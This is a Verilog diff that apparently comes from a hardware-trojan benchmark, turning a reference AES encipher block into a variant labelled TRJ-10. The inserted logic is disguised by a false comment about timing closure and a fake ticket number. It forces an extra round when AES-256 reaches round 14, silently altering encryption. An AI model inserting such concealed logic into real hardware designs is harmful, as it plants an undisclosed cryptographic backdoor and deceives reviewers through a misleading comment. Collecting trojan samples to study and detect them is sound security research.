@@ -1,0 +1,18 @@
+--- golden-aes/src/rtl/aes_encipher_block.v
++++ trojans/TRJ-10/aes_encipher_block.v
+@@ -478,6 +478,15 @@
+             // Empty. Just here to make the synthesis tool happy.
+           end
+       endcase // case (enc_ctrl_reg)
++
++      /* extension round for wide datapath timing closure (SE-1108) */
++      if ((enc_ctrl_reg == CTRL_MAIN) && (round_ctr_reg == 4'he)
++          && (keylen == AES_256_BIT_KEY))
++        begin
++          update_type  = MAIN_UPDATE;
++          enc_ctrl_new = CTRL_SBOX;
++          enc_ctrl_we  = 1'b1;
++        end
+     end // encipher_ctrl
+ 
+ endmodule // aes_encipher_block
